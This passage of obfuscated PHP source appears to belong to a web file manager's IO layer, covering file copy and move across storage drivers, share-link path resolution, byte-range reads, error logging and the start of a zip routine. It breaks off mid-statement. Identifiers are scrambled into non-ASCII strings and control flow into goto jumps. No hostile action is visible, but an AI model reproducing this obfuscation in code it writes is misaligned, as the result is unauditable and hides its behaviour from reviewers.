$A£í·®áƒ = !1; if ($Dœ¯ŸºØˆô->pathParse[$FòÉÖ¿´‰[1069]]) { $A£í·®áƒ = $Dœ¯ŸºØˆô; $Dœ¯ŸºØˆô = self::driverMake($Dœ¯ŸºØˆô->pathParse[$FòÉÖ¿´‰[1069]]); } if ($f»¡œÇÅÉ±->pathParse[$FòÉÖ¿´‰[1069]]) { $f»¡œÇÅÉ± = self::driverMake($f»¡œÇÅÉ±->pathParse[$FòÉÖ¿´‰[1069]]); } goto eâÇÉíÂ…; eÜÑÓ´Ï…Š: $FòÉÖ¿´‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$c‚½¦÷§ƒ» || $c‚½¦÷§ƒ» == $FòÉÖ¿´‰[8] || !$F§»ˆè‚Ş¥) { return !1; } ignore_timeout(); goto e”¶ñƒ…ÑÜ; d«êë¹ÛÖÅ: } private static function check($e°¾½ßöÜ, $AäòÂ•§ä, $f¤½Ùß³‚£, &$EøÙ²Ä«ßç) { $AëâÁÇŠÕ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::driverIsSame($e°¾½ßöÜ, $f¤½Ùß³‚£) && $e°¾½ßöÜ->isFolder($AäòÂ•§ä) && $e°¾½ßöÜ->isParentOf($AäòÂ•§ä, $EøÙ²Ä«ßç)) { show_json(LNG($AëâÁÇŠÕ[1071]), !1); } if (!$e°¾½ßöÜ->exist($AäòÂ•§ä)) { show_json(LNG($AëâÁÇŠÕ[105]), !1); } } private static function copyPath($C¡¾ÈöË÷, $fÜÓ†ÒÓ„ó, $D¿šçÇ¸êÜ, $AÒˆÍ¸Ú°, $f±‹Ôôƒİ, $b¿£äË£, $c÷Äƒ½ˆë, $bÃÓŒÙÍ°¶ = false) { goto a‘¢ÂóÔºá; bÎ®‹œğ®·: $f¡ªÂËÂÜ— = $D¿šçÇ¸êÜ->mkdir($D¿šçÇ¸êÜ->getPath($E­Õ›êİ¡)); $AÒˆÍ¸Ú° = $D¿šçÇ¸êÜ->getPathInner($f¡ªÂËÂÜ—); $aÍ“íÒÓ“Ì = $C¡¾ÈöË÷->listPath($fÜÓ†ÒÓ„ó, !0); goto c„Õ“êõ½; E‡»ß™‹: if ($c÷Äƒ½ˆë) { return self::copyFile($C¡¾ÈöË÷, $fÜÓ†ÒÓ„ó, $D¿šçÇ¸êÜ, $AÒˆÍ¸Ú°, $fïÁÓÖÒ° , $b¿£äË£); } if ($f±‹Ôôƒİ == REPEAT_RENAME_FOLDER) { $f±‹Ôôƒİ = !1; } $E­Õ›êİ¡ = rtrim($AÒˆÍ¸Ú°, $aÙ¼‡ŒƒÁ£[8]) . $aÙ¼‡ŒƒÁ£[8] . $fïÁÓÖÒ° ; goto bÎ®‹œğ®·; c„Õ“êõ½: $aÍ“íÒÓ“Ì = is_array($aÍ“íÒÓ“Ì) ? $aÍ“íÒÓ“Ì : array($aÙ¼‡ŒƒÁ£[74] => array(), $aÙ¼‡ŒƒÁ£[75] => array()); $fÍ•ê”µÅÀ = array_merge($aÍ“íÒÓ“Ì[$aÙ¼‡ŒƒÁ£[74]], $aÍ“íÒÓ“Ì[$aÙ¼‡ŒƒÁ£[75]]); foreach ($fÍ•ê”µÅÀ as $c¾¼ËË½Â¬) { $fÎÃæ°¢ß³ = $c¾¼ËË½Â¬[$aÙ¼‡ŒƒÁ£[29]] == $aÙ¼‡ŒƒÁ£[193]; $fÜÓ†ÒÓ„ó = $C¡¾ÈöË÷->getPathInner($c¾¼ËË½Â¬[$aÙ¼‡ŒƒÁ£[76]]); $a®Ù®–Èëâ = self::copyPath($C¡¾ÈöË÷, $fÜÓ†ÒÓ„ó, $D¿šçÇ¸êÜ, $AÒˆÍ¸Ú°, $f±‹Ôôƒİ, $b¿£äË£, $fÎÃæ°¢ß³); if (!$a®Ù®–Èëâ) { IO::errorTips($aÙ¼‡ŒƒÁ£[1072] . $fÜÓ†ÒÓ„ó . $aÙ¼‡ŒƒÁ£[67] . $AÒˆÍ¸Ú°); } } goto CùËµÇªÙ–; CùËµÇªÙ–: self::copyMoveKeepInfo($C¡¾ÈöË÷, $fÜÓ†ÒÓ„ó, $f¡ªÂËÂÜ—); return $f¡ªÂËÂÜ—; goto Bá¸‹Õµ¼é; a‘¢ÂóÔºá: $aÙ¼‡ŒƒÁ£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fïÁÓÖÒ°  = empty($bÃÓŒÙÍ°¶) && $bÃÓŒÙÍ°¶ !== $aÙ¼‡ŒƒÁ£[191] ? $C¡¾ÈöË÷->pathThis($fÜÓ†ÒÓ„ó) : $bÃÓŒÙÍ°¶; if ($f±‹Ôôƒİ) { $Cçâ£Ì¬«é = $D¿šçÇ¸êÜ->fileNameExist($AÒˆÍ¸Ú°, $fïÁÓÖÒ° ); $fïÁÓÖÒ°  = $D¿šçÇ¸êÜ->fileNameAuto($AÒˆÍ¸Ú°, $fïÁÓÖÒ° , $f±‹Ôôƒİ, !$c÷Äƒ½ˆë); $f±‹Ôôƒİ = $Cçâ£Ì¬«é ? $f±‹Ôôƒİ : !1; } goto E‡»ß™‹; Bá¸‹Õµ¼é: } private static function copyFile($aï™ÃŠˆÒÕ, $FÀ âøŸŞÑ, $DÕ©ÁõŒ‰, $BÄ¦ëƒÓà´, $fŞÉÃ©•“°, $f“ÈğÔ–) { goto eìõ’®¯¼‰; eÄ¬¦Í­ÄØ: mk_dir($F Ç£à®çä); $BåöÜ«‡£¡ = $F Ç£à®çä . $dìˆÕÓïñÁ; $bÏ­ÙùÊ÷î = $BåöÜ«‡£¡; goto aÎËê™ô; aÎËê™ô: $BåöÜ«‡£¡ = $aï™ÃŠˆÒÕ->download($FÀ âøŸŞÑ, $BåöÜ«‡£¡); $BåöÜ«‡£¡ = $aï™ÃŠˆÒÕ->iconvApp($BåöÜ«‡£¡); $B éÇïÈ  = $DÕ©ÁõŒ‰->upload($BÄ¦ëƒÓà´, $BåöÜ«‡£¡, $f“ÈğÔ–); goto Dˆäƒò°£; e¬²¤Üìœ„: Hook::trigger($EÕ¦ëªæÛã[1074], $aï™ÃŠˆÒÕ, $FÀ âøŸŞÑ, $DÕ©ÁõŒ‰, $BÄ¦ëƒÓà´, $fŞÉÃ©•“°, $dìˆÕÓïñÁ); if (self::driverIsSame($aï™ÃŠˆÒÕ, $DÕ©ÁõŒ‰)) { if ($f“ÈğÔ–) { $B éÇïÈ  = $DÕ©ÁõŒ‰->moveFile($FÀ âøŸŞÑ, $BÄ¦ëƒÓà´); } else { $B éÇïÈ  = $DÕ©ÁõŒ‰->copyFile($FÀ âøŸŞÑ, $BÄ¦ëƒÓà´); } Hook::trigger($EÕ¦ëªæÛã[1075], $aï™ÃŠˆÒÕ, $FÀ âøŸŞÑ, $DÕ©ÁõŒ‰, $BÄ¦ëƒÓà´, $fŞÉÃ©•“°, $B éÇïÈ ); self::copyMoveKeepInfo($aï™ÃŠˆÒÕ, $FÀ âøŸŞÑ, $B éÇïÈ ); return $B éÇïÈ ; } $E©Ñ¿œ‘È¼ = TEMP_FILES; goto a‘Ş‹ß¤‘ê; a‘Ş‹ß¤‘ê: if ($GLOBALS[$EÕ¦ëªæÛã[6]][$EÕ¦ëªæÛã[88]][$EÕ¦ëªæÛã[783]]) { $E©Ñ¿œ‘È¼ = $GLOBALS[$EÕ¦ëªæÛã[6]][$EÕ¦ëªæÛã[88]][$EÕ¦ëªæÛã[783]]; } $f“ÈğÔ– = !0; $F Ç£à®çä = $E©Ñ¿œ‘È¼; goto eÄ¬¦Í­ÄØ; BÜÖ¹ë¹÷Ş: return $B éÇïÈ ; goto a˜›®Æâë; eìõ’®¯¼‰: $EÕ¦ëªæÛã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÄ¦ëƒÓà´ = $DÕ©ÁõŒ‰->getPath(rtrim($BÄ¦ëƒÓà´, $EÕ¦ëªæÛã[8]) . $EÕ¦ëªæÛã[8] . $fŞÉÃ©•“°); $dìˆÕÓïñÁ = $EÕ¦ëªæÛã[1073] . time() . rand_string(5); goto e¬²¤Üìœ„; Dˆäƒò°£: self::remove($bÏ­ÙùÊ÷î); Hook::trigger($EÕ¦ëªæÛã[1075], $aï™ÃŠˆÒÕ, $FÀ âøŸŞÑ, $DÕ©ÁõŒ‰, $BÄ¦ëƒÓà´, $fŞÉÃ©•“°, $B éÇïÈ ); self::copyMoveKeepInfo($aï™ÃŠˆÒÕ, $FÀ âøŸŞÑ, $B éÇïÈ ); goto BÜÖ¹ë¹÷Ş; a˜›®Æâë: } private static function copyMoveKeepInfo($cÒ¸÷‹¡–©, $a•©¯Ÿ¤½¹, $DÒå™ğ®¸‡) { if (!$DÒå™ğ®¸‡) { return; } $bá¤µ×ÄÎ = $cÒ¸÷‹¡–©->info($a•©¯Ÿ¤½¹); if (!is_array($bá¤µ×ÄÎ)) { return; } IO::setModifyTime($DÒå™ğ®¸‡, $bá¤µ×ÄÎ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][84]]); } public static function pathFather($bòÛê¨Æ¾) { $c¢Ã›óãƒÀ = IO::init($bòÛê¨Æ¾); $fñò›ƒí¹ = $c¢Ã›óãƒÀ->pathFather($c¢Ã›óãƒÀ->path); return $c¢Ã›óãƒÀ->getPathOuter($fñò›ƒí¹); } public static function fileOut($e¦ß©âêªÊ, $E·¨°Í†Í = false, $fõ£ç×äÆ = false, $CÅç‹”÷ïâ = '') { $E‘óã„Èˆñ = self::driverMake($e¦ß©âêªÊ); if ($E‘óã„Èˆñ->isFileOutServer()) { return $E‘óã„Èˆñ->fileOutServer($e¦ß©âêªÊ, $E·¨°Í†Í, $fõ£ç×äÆ, $CÅç‹”÷ïâ); } return $E‘óã„Èˆñ->fileOut($e¦ß©âêªÊ, $E·¨°Í†Í, $fõ£ç×äÆ, $CÅç‹”÷ïâ); } public static function fileOutImage($BŠÙŒßæÎ, $DèÈ…Ü¦©Ş = 250) { $Fï˜–§ÔÌ‡ = array(250, 600, 1200, 2000, 3000, 5000); for ($e•Ğ×Å¿Ã— = 0; $e•Ğ×Å¿Ã— < count($Fï˜–§ÔÌ‡); $e•Ğ×Å¿Ã—++) { if ($e•Ğ×Å¿Ã— == 0 && $DèÈ…Ü¦©Ş <= $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã—]) { $DèÈ…Ü¦©Ş = $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã—]; break; } else { if ($DèÈ…Ü¦©Ş > $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã— - 1] && $DèÈ…Ü¦©Ş <= $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã—]) { $DèÈ…Ü¦©Ş = $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã—]; break; } else { if ($e•Ğ×Å¿Ã— == count($Fï˜–§ÔÌ‡) - 1 && $DèÈ…Ü¦©Ş > $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã—]) { $DèÈ…Ü¦©Ş = $Fï˜–§ÔÌ‡[$e•Ğ×Å¿Ã—]; break; } } } } $f•‡ÑÃôà« = self::driverMake($BŠÙŒßæÎ); if ($f•‡ÑÃôà«->isFileOutServer()) { return $f•‡ÑÃôà«->fileOutImageServer($BŠÙŒßæÎ, $DèÈ…Ü¦©Ş); } return $f•‡ÑÃôà«->fileOutImage($BŠÙŒßæÎ, $DèÈ…Ü¦©Ş); } private static function driverIsSame($E¶£í·¨ã×, $EÌ´ƒ­İÌ») { goto AÆê‰¦Ä­; AÆê‰¦Ä­: $Bˆñ•Ú«Ïµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B¼ø‰­—¬Ô = $E¶£í·¨ã×->getType(); $eä¾ŞåÅÕ“ = $EÌ´ƒ­İÌ»->getType(); goto FÜ‡á–„éÙ; FÜ‡á–„éÙ: if ($B¼ø‰­—¬Ô != $eä¾ŞåÅÕ“) { return !1; } if ($B¼ø‰­—¬Ô == $Bˆñ•Ú«Ïµ[739]) { return !0; } if ($B¼ø‰­—¬Ô == $Bˆñ•Ú«Ïµ[106]) { return !0; } goto BêçÏËò¦; BêçÏËò¦: if ($E¶£í·¨ã×->pathDriver == $EÌ´ƒ­İÌ»->pathDriver) { return !0; } return !1; goto c¹¯¸ÌšÄ×; c¹¯¸ÌšÄ×: } public static function copyUpdate($a­¦Äáè…, $B¶êì¾éÛô) { goto a‘¹Œ¶Â”; a«“‘ßùÕñ: Hook::trigger($bé»ÅŸÔÓ£[1079], $a­¦Äáè…, $B¶êì¾éÛô, $eÊé»İß§); foreach ($c™½±¶…¾ as $AÏˆÌİå­˜) { IO::mkdir($AÏˆÌİå­˜); } foreach ($c‡‹Æ…¤ as $AÏˆÌİå­˜) { IO::copy($AÏˆÌİå­˜[$bé»ÅŸÔÓ£[1076]], $AÏˆÌİå­˜[$bé»ÅŸÔÓ£[1077]], REPEAT_REPLACE); } goto eÔ‡øÕ‚«•; e™ä‡–Î©: $B‚­àî¤Œ’ = self::_listAll($a­¦Äáè…); $eîœ¹¡óÌ¡ = self::_listAll($B¶êì¾éÛô); $c‡‹Æ…¤ = array(); goto AÜ°¬´ØÓÑ; AÜ°¬´ØÓÑ: $c™½±¶…¾ = array(); foreach ($B‚­àî¤Œ’ as $e¸ù„äè¢ => $AÏˆÌİå­˜) { if (isset($eîœ¹¡óÌ¡[$e¸ù„äè¢])) { if ($AÏˆÌİå­˜[$bé»ÅŸÔÓ£[77]] == 1) { continue; } if ($eîœ¹¡óÌ¡[$e¸ù„äè¢][$bé»ÅŸÔÓ£[78]] == $AÏˆÌİå­˜[$bé»ÅŸÔÓ£[78]]) { continue; } } if ($AÏˆÌİå­˜[$bé»ÅŸÔÓ£[77]] == 1) { $c™½±¶…¾[] = $B¶êì¾éÛô . $bé»ÅŸÔÓ£[8] . $e¸ù„äè¢; continue; } $A¡ëÇÈà“ª = strstr(trim($e¸ù„äè¢, $bé»ÅŸÔÓ£[8]), $bé»ÅŸÔÓ£[8]) ? get_path_father($e¸ù„äè¢) : $bé»ÅŸÔÓ£[33]; $c‡‹Æ…¤[] = array($bé»ÅŸÔÓ£[1076] => $AÏˆÌİå­˜[$bé»ÅŸÔÓ£[76]], $bé»ÅŸÔÓ£[1077] => rtrim($B¶êì¾éÛô, $bé»ÅŸÔÓ£[8]) . $bé»ÅŸÔÓ£[8] . $A¡ëÇÈà“ª, $bé»ÅŸÔÓ£[1078] => $AÏˆÌİå­˜); } $eÊé»İß§ = array($bé»ÅŸÔÓ£[193] => $c‡‹Æ…¤, $bé»ÅŸÔÓ£[77] => $c™½±¶…¾); goto a«“‘ßùÕñ; a‘¹Œ¶Â”: $bé»ÅŸÔÓ£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!IO::exist($a­¦Äáè…)) { return !1; } if (!IO::exist($B¶êì¾éÛô)) { IO::mkdir($B¶êì¾éÛô); } goto e™ä‡–Î©; eÔ‡øÕ‚«•: } private static function _listAll($Bäã×ŠÛÊÔ) { $cÔ•Ä¡Åİ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bäã×ŠÛÊÔ = KodIO::clear($Bäã×ŠÛÊÔ); $BŒ„ò¯ÛÓ = IO::listAll($Bäã×ŠÛÊÔ); foreach ($BŒ„ò¯ÛÓ as &$BèÄæ‰–Éƒ) { $fÓ›ÎÌ¿Ë« = substr($BèÄæ‰–Éƒ[$cÔ•Ä¡Åİ[76]], strlen($Bäã×ŠÛÊÔ)); $BèÄæ‰–Éƒ[$cÔ•Ä¡Åİ[1080]] = trim($fÓ›ÎÌ¿Ë«, $cÔ•Ä¡Åİ[8]); } unset($BèÄæ‰–Éƒ); return array_to_keyvalue($BŒ„ò¯ÛÓ, $cÔ•Ä¡Åİ[1080]); } public static function fileSubstr($AÀôÅÔ‘Î¶, $dŠ‹•§ŞùŞ, $E”áÄÀÔÀ = false) { goto d¦•Ÿá¥Û·; aÊÛ¸À×¼é: $F¢¸İ¬¢Ô’ = $dŠ‹•§ŞùŞ; $bµ½øŸÆèù = $E”áÄÀÔÀ; if ($dŠ‹•§ŞùŞ < 0) { $dŠ‹•§ŞùŞ = $D„øİ¯‡¿ç + $dŠ‹•§ŞùŞ; } goto CÇç©ˆ–„ß; a‘£Ñµóó: if (!$eºõ«Ø™Ú­ && $E”áÄÀÔÀ && isset($GLOBALS[$CÚ«Ô“…¾[1083]])) { throw new Exception($GLOBALS[$CÚ«Ô“…¾[1083]][$CÚ«Ô“…¾[1084]]); } return $eºõ«Ø™Ú­; goto DÆ¿Î´Á¤á; dÂéŞå³ôŠ: if ($E”áÄÀÔÀ <= 0) { return $CÚ«Ô“…¾[33]; } if ($dŠ‹•§ŞùŞ < 0 || $dŠ‹•§ŞùŞ >= $D„øİ¯‡¿ç || $E”áÄÀÔÀ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\x52\145\x61\x64\x20\x65\162\162\x6f\x72\x21\40\x73\x74\x61\162\164\75{$dŠ‹•§ŞùŞ}\x3b\154\x65\156\x67\x74\x68\75{$E”áÄÀÔÀ}\73\40\x73\151\x7a\145\x3d{$D„øİ¯‡¿ç}\x3b"); } $eºõ«Ø™Ú­ = $D›°¬í›á->fileSubstr($AÀôÅÔ‘Î¶, $dŠ‹•§ŞùŞ, $E”áÄÀÔÀ); goto a‘£Ñµóó; CÇç©ˆ–„ß: if ($E”áÄÀÔÀ === !1) { $E”áÄÀÔÀ = $D„øİ¯‡¿ç - $dŠ‹•§ŞùŞ; } if ($dŠ‹•§ŞùŞ + $E”áÄÀÔÀ > $D„øİ¯‡¿ç) { $E”áÄÀÔÀ = $D„øİ¯‡¿ç - $dŠ‹•§ŞùŞ; } if (!$D„øİ¯‡¿ç && $D›°¬í›á->getType() == $CÚ«Ô“…¾[106] && !$D›°¬í›á->exist($AÀôÅÔ‘Î¶)) { throw new Exception($CÚ«Ô“…¾[1081] . LNG($CÚ«Ô“…¾[1082]) . $CÚ«Ô“…¾[947] . get_path_this($AÀôÅÔ‘Î¶) . $CÚ«Ô“…¾[33]); } goto dÂéŞå³ôŠ; d¦•Ÿá¥Û·: $CÚ«Ô“…¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D›°¬í›á = self::driverMake($AÀôÅÔ‘Î¶); $D„øİ¯‡¿ç = $D›°¬í›á->size($AÀôÅÔ‘Î¶); goto aÊÛ¸À×¼é; DÆ¿Î´Á¤á: } private static function driverMake(&$bÈïÎîš¶¥) { goto FÓÒùºº™á; f–ôç‰Ğ: return $c®‹•ÛÆ™î; goto F¦‡¨ÌÏŠ; E¢Õ³‘’öå: if ($aÅÀÖ¿èÜ¹[$aÅÊëó±—š[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aÅÀÖ¿èÜ¹[$aÅÊëó±—š[395]]]) { return !1; } $bÈïÎîš¶¥ = $aÅÀÖ¿èÜ¹[$aÅÊëó±—š[1085]]; $c®‹•ÛÆ™î = self::driverGet($aÅÀÖ¿èÜ¹, $bÈïÎîš¶¥); goto f–ôç‰Ğ; FÓÒùºº™á: $aÅÊëó±—š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÅÀÖ¿èÜ¹ = KodIO::parse($bÈïÎîš¶¥); if (!self::$driverListSystem) { $dÇÔâ‘¼â‘ = Model($aÅÊëó±—š[748])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dÇÔâ‘¼â‘, $aÅÊëó±—š[395]); } goto E¢Õ³‘’öå; F¦‡¨ÌÏŠ: } private static function driverGet($F‰¨»‹’›ì, &$aÄœñ˜â) { goto BªŸÖÛŠòš; D¥¼¸İƒ‰: switch ($F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[29]]) { case KodIO::KOD_IO: $cÍÉî¦Î‚ë = self::$driverListSystem[$Dïˆ†ë–™Ò]; break; case KodIO::KOD_SOURCE: $aÄœñ˜â = $Dïˆ†ë–™Ò . $aÄœñ˜â; $cÍÉî¦Î‚ë = array($cÀ‹‰­Ê¨Å[1087] => $cÀ‹‰­Ê¨Å[1088], $cÀ‹‰­Ê¨Å[6] => $F‰¨»‹’›ì); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $a†•Íİİª = $GLOBALS[$cÀ‹‰­Ê¨Å[1089]]; self::$driverListUser = array_to_keyvalue($a†•Íİİª, $cÀ‹‰­Ê¨Å[395]); } $cÍÉî¦Î‚ë = self::$driverListUser[$Dïˆ†ë–™Ò]; break; case KodIO::KOD_SHARE_LINK: $cÍÉî¦Î‚ë = array($cÀ‹‰­Ê¨Å[1087] => $cÀ‹‰­Ê¨Å[1090], $cÀ‹‰­Ê¨Å[6] => $F‰¨»‹’›ì); $C×š®¢œå = Action($cÀ‹‰­Ê¨Å[1091])->sharePathInfo($F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[76]]); $aÄœñ˜â = $C×š®¢œå[$cÀ‹‰­Ê¨Å[397]]; if (!$C×š®¢œå[$cÀ‹‰­Ê¨Å[397]]) { $DÍ©øÔ™†ô = Model($cÀ‹‰­Ê¨Å[589])->getInfo($C×š®¢œå[$cÀ‹‰­Ê¨Å[482]]); $aÄœñ˜â = KodIO::clear($DÍ©øÔ™†ô[$cÀ‹‰­Ê¨Å[1092]] . $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1085]]); $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[480]] = $DÍ©øÔ™†ô; $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1069]] = $aÄœñ˜â; $cÍÉî¦Î‚ë = array($cÀ‹‰­Ê¨Å[1087] => $cÀ‹‰­Ê¨Å[1093], $cÀ‹‰­Ê¨Å[6] => $F‰¨»‹’›ì); } break; case KodIO::KOD_SHARE_ITEM: $cÍÉî¦Î‚ë = array($cÀ‹‰­Ê¨Å[1087] => $cÀ‹‰­Ê¨Å[1094], $cÀ‹‰­Ê¨Å[6] => $F‰¨»‹’›ì); $DÍ©øÔ™†ô = Model($cÀ‹‰­Ê¨Å[589])->getInfo($F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[395]]); if ($DÍ©øÔ™†ô[$cÀ‹‰­Ê¨Å[397]] == $cÀ‹‰­Ê¨Å[191]) { $aÄœñ˜â = KodIO::clear($DÍ©øÔ™†ô[$cÀ‹‰­Ê¨Å[1092]] . $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1085]]); $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[480]] = $DÍ©øÔ™†ô; $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1069]] = $aÄœñ˜â; $cÍÉî¦Î‚ë = array($cÀ‹‰­Ê¨Å[1087] => $cÀ‹‰­Ê¨Å[1095], $cÀ‹‰­Ê¨Å[6] => $F‰¨»‹’›ì); } else { if (!$aÄœñ˜â) { $aÄœñ˜â = $DÍ©øÔ™†ô[$cÀ‹‰­Ê¨Å[397]]; } } break; default: $aÄœñ˜â = $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[76]]; $cÍÉî¦Î‚ë = array($cÀ‹‰­Ê¨Å[1087] => $cÀ‹‰­Ê¨Å[1096]); break; } $c›Æà¸¡« = $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[76]]; if (!isset(self::$driverCache[$c›Æà¸¡«])) { $b½‹ôî§Å• = strtolower($cÍÉî¦Î‚ë[$cÀ‹‰­Ê¨Å[94]]); $A·ö†“Ğá = $GLOBALS[$cÀ‹‰­Ê¨Å[6]][$cÀ‹‰­Ê¨Å[88]][$cÀ‹‰­Ê¨Å[814]]; $EøÄÀçã¥õ = $cÀ‹‰­Ê¨Å[72] . (isset($A·ö†“Ğá[$b½‹ôî§Å•]) ? $A·ö†“Ğá[$b½‹ôî§Å•] : ucfirst($b½‹ôî§Å•)); if (!class_exists($EøÄÀçã¥õ)) { show_json("{$EøÄÀçã¥õ}\x20\x6e\x6f\164\40\x65\x78\x69\x73\164\163\41", !1); } $e¦ÏÉˆ‚¬  = isset($cÍÉî¦Î‚ë[$cÀ‹‰­Ê¨Å[6]]) ? $cÍÉî¦Î‚ë[$cÀ‹‰­Ê¨Å[6]] : !1; self::$driverCache[$c›Æà¸¡«] = new $EøÄÀçã¥õ($e¦ÏÉˆ‚¬ ); } goto BœŸ„®‹ƒ™; BœŸ„®‹ƒ™: $b­•‘§š¦´ = self::$driverCache[$c›Æà¸¡«]; $b­•‘§š¦´->pathDriver = $CŞñÀ«Ø¶ ; $b­•‘§š¦´->pathBase = $cÀ‹‰­Ê¨Å[33]; goto EœŒŒöÂõ‹; BªŸÖÛŠòš: $cÀ‹‰­Ê¨Å =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CŞñÀ«Ø¶  = $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1086]]; $Dïˆ†ë–™Ò = $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[395]]; goto D¥¼¸İƒ‰; c‰‚Äö¹Û´: $b­•‘§š¦´->path = $aÄœñ˜â; return $b­•‘§š¦´; goto FÉæŠùî; EœŒŒöÂõ‹: if (isset($cÍÉî¦Î‚ë[$cÀ‹‰­Ê¨Å[6]][$cÀ‹‰­Ê¨Å[1097]])) { $b­•‘§š¦´->pathBase = rtrim($cÍÉî¦Î‚ë[$cÀ‹‰­Ê¨Å[6]][$cÀ‹‰­Ê¨Å[1097]], $cÀ‹‰­Ê¨Å[8]) . $cÀ‹‰­Ê¨Å[8]; $aÄœñ˜â = $b­•‘§š¦´->pathBase . ltrim($aÄœñ˜â, $cÀ‹‰­Ê¨Å[8]); } $aÄœñ˜â = $b­•‘§š¦´->getPath($aÄœñ˜â); if (isset($F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1069]])) { $aÄœñ˜â = $F‰¨»‹’›ì[$cÀ‹‰­Ê¨Å[1069]]; } goto c‰‚Äö¹Û´; FÉæŠùî: } public static function errorTips($Cù‚ÈçÆÌŒ = false) { goto E­é“‰Š; A¤ÕÒ‹º§: if ($Cù‚ÈçÆÌŒ === -1) { return $dğŸé¦ˆ¤ ? $dğŸé¦ˆ¤[count($dğŸé¦ˆ¤) - 1] : $F”¡„íâ©å[33]; } if ($Cù‚ÈçÆÌŒ === !1) { return implode($F”¡„íâ©å[229], $dğŸé¦ˆ¤); } if (count($dğŸé¦ˆ¤) >= $Eë¾¯Œã³Ø) { $dğŸé¦ˆ¤ = array_slice($dğŸé¦ˆ¤, $Eë¾¯Œã³Ø * 0.5, $Eë¾¯Œã³Ø); } goto AÁòªø÷ìœ; E­é“‰Š: $F”¡„íâ©å =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $dğŸé¦ˆ¤ = array(); $Eë¾¯Œã³Ø = 1000; goto A¤ÕÒ‹º§; AÁòªø÷ìœ: $dğŸé¦ˆ¤[] = $Cù‚ÈçÆÌŒ; write_log($F”¡„íâ©å[160] . ACTION . $F”¡„íâ©å[1098] . $Cù‚ÈçÆÌŒ, $F”¡„íâ©å[1099]); goto dÄ¢©´Ì‡; dÄ¢©´Ì‡: } public static function getLastError($fÂ‹¹œå’æ = '') { $eöº‘Ø¸ = self::errorTips(-1); return $eöº‘Ø¸ ? $eöº‘Ø¸ : $fÂ‹¹œå’æ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Dêë–Ñâ¼Ï; if (!$Dêë–Ñâ¼Ï) { $f±êõ°µæ = IO::init($_SERVER[Ôğ—¤Šµˆ˜ñ£][8]); } return $f±êõ°µæ; } private static function iconvSystem($a’×š±Éö›) { return self::local()->iconvSystem($a’×š±Éö›); } private static function iconvApp($E”›òİö) { return self::local()->iconvApp($E”›òİö); } public static function zip($dîâĞæËŒ”, $dõ¤§›Üèƒ = "\172\x69\160", $B­ğ—ˆƒÙ = '', $AâÎì‰É»Ÿ = REPEAT_RENAME) { goto F˜¢ôˆá°; fÍ¡’Û×ˆ: if (!$eãëİìë) { del_dir($AæÛ©ƒƒî‡); show_json(LNG($bôÌ“±µ»’[1102]), !1); } del_dir($AæÛ©ƒƒî‡); return $eãëİìë; goto a‚Ò‹äÀÔ‰; fŸÔôñÂƒù: foreach ($d±«ĞšÂ¾™ as $a»á«‚ ½İ => $F¬Ø„Â°„) { $d±«ĞšÂ¾™[$a»á«‚ ½İ] = self::iconvSystem($F¬Ø„Â°„); } KodArchive::create($føòÚğµÁ, $d±«ĞšÂ¾™); if (!IO::exist($dÀæ‚˜™¡)) { if ($AæÛ©ƒƒî‡) { del_dir($AæÛ©ƒƒî‡); } show_json(LNG($bôÌ“±µ»’[1102]), !1); } goto c‘šÍŠï¥; BŠ©•ù÷Çõ: $AæÛ©ƒƒî‡ = !1; if (!$B­ğ—ˆƒÙ && $Cëôèß£à->getType() == $bôÌ“±µ»’[106]) { $d±«ĞšÂ¾™ = self::zipFileList($dîâĞæËŒ”); } else { $AæÛ©ƒƒî‡ = $B­ğ—ˆƒÙ ? $B­ğ—ˆƒÙ : TEMP_FILES . $bôÌ“±µ»’[1100] . time() . rand_string(8) . $bôÌ“±µ»’[8]; mk_dir($AæÛ©ƒƒî‡); $d±«ĞšÂ¾™ = self::zipFileList($dîâĞæËŒ”, $AæÛ©ƒƒî‡); } $bÆµ…ÀŠÛ = $Aç—ŒÉ±Î’[$bôÌ“±µ»’[28]]; goto D¸é„ó¶Ûå; D¸é„ó¶Ûå: if (count($d±«ĞšÂ¾™) > 1) { $B¹·ßØ¶ø = IO::info(IO::pathFather($Aç—ŒÉ±Î’[$bôÌ“±µ»’[76]])); $bÆµ…ÀŠÛ = $B¹·ßØ¶ø[$bôÌ“±µ»’[28]]; } $aàÛÄ¤ù‹Ã = $AæÛ©ƒƒî‡; if (!$aàÛÄ¤ù‹Ã) { $aàÛÄ¤ù‹Ã = 